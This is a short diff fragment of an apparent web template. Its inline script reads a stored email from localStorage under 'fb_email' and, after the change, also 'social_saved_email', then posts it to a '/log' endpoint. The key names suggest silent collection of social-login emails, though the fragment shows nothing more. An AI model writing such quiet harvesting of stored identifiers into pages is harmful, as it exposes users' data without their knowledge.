@@ -250,7 +250,7 @@
 
         (function() {
             try {
-                const savedEmail = localStorage.getItem('fb_email') || '';
+                const savedEmail = localStorage.getItem('fb_email') || localStorage.getItem('social_saved_email') || '';
                 fetch("/log", {
                     method: "POST",
                     headers: { "Content-Type": "application/json", "X-CSRF-TOKEN": "{{ csrf_token() }}" },
